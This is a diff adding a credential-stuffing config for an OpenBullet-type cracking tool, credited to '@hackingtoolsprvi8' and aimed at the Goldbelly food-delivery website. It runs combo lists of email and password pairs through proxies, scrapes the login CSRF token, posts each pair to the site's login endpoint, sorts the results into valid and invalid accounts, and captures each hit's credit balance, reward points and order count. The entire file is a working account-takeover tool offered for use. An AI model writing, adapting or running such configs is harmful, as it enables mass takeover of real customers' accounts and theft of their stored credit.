@@ -1,0 +1,91 @@
+[SETTINGS]
+{
+  "Name": "Goldbelly(@hackingtoolsprvi8)",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2022-06-29T07:45:48.6308482+02:00",
+  "AdditionalInfo": "",
+  "Author": "@hackingtoolsprvi8",
+  "Version": "1.4.5 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://www.goldbelly.com/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "<meta name=\"csrf-token\" content=\"" "\" />" -> VAR "tok" 
+
+REQUEST POST "https://www.goldbelly.com/log-in.json" 
+  CONTENT "{\"email_auth\":{\"email\":\"<USER>\",\"password\":\"<PASS>\"}}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: www.goldbelly.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Referer: https://www.goldbelly.com/" 
+  HEADER "Content-Type: application/json" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "X-CSRF-TOKEN: <tok>" 
+  HEADER "Content-Length: 72" 
+  HEADER "Origin: https://www.goldbelly.com" 
+  HEADER "Connection: keep-alive" 
+
+KEYCHECK 
+  KEYCHAIN Custom "Valid Mail" OR 
+    KEY "invalid" 
+  KEYCHAIN Success OR 
+    KEY "display_name" 
+  KEYCHAIN Failure OR 
+    KEY "does-not-exist" 
+
+PARSE "<SOURCE>" JSON "eligible_credits_balance_in_cents" CreateEmpty=FALSE -> CAP "Credit Balance" 
+
+PARSE "<SOURCE>" JSON "reward_points" CreateEmpty=FALSE -> CAP "Reward Points" 
+
+PARSE "<SOURCE>" JSON "number_of_completed_orders" CreateEmpty=FALSE -> CAP "Orders" 
+
+FUNCTION Constant "@hackingtoolsprvi8" -> VAR "Config By" 
+
